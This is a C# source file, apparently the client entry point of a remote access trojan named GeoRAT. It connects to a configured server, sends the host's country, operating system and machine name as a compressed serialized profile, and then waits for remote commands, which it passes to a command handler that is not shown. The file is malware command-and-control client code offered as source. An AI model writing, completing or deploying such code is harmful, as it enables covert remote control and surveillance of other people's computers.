using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Client;
using Cliet;
using GeoRAT.Client.CommandHandlers;
using GeoRAT.Client.Compressor;
using GeoRAT.Client.Network;
using GeoRAT.Client.PacketStruct;

namespace GeoRAT.Client
{
    class Program
    {
        static void Main(string[] args)
        {
            //Create new client network instance on ip / port
            //associate event handlers, begin listening 
            ClientNetwork network = new ClientNetwork("127.0.0.1", 9150);
            network.OnConnected += OnConnected;
            network.BeginConnect();
            Process.GetCurrentProcess().WaitForExit();

        }

        //When connected to server 
        static void OnConnected(Socket s)
        {
            Console.WriteLine("Connected to {0}", s.RemoteEndPoint.ToString());
            Console.WriteLine("WAITING For commands" + Environment.NewLine);
            //Create datareader instance from s Socket and begin reading data 
            DataReader reader = new DataReader(s);
            reader.OnDisconnected += OnDisconnectedHandler;
            reader.OnReceived += HandleCommand;

            Serializer ser = new Serializer();
  
            Info i = new Info(GetInfo.GetCountry(), GetInfo.GetOS(), GetInfo.Name()); //Geenerate Info object 
            var buf = ser.Serialize(i);
            var cmp = Compression.Compress(buf); //Compress data using GZIP 
            var len = cmp.Length;
            var sendLen = BitConverter.GetBytes(len);
            reader.Send(sendLen);//Send data length
            reader.Send(cmp); //Send data itself 


        }

        //If sock is disconnected clean it 
        static void OnDisconnectedHandler(Socket socket)
        {
            socket.Close();
            socket.Dispose();
            Process.GetCurrentProcess().Kill();
        }

        //When received command, deserialize it, then pass to commandhandler static class function which will decide what to do next 
        static void HandleCommand( byte[] buf, int size)
        {

            Commands k = new Commands();
            CommandHandler handler = new CommandHandler();
            CommandSerializer sr = new CommandSerializer();
            var compressedbuf = Compression.Decompress(buf);
            k = sr.Deserialize(compressedbuf);
            Console.WriteLine("Got new data, length {0} bytes", size);
            handler.Handle(k);
        }
    }
}
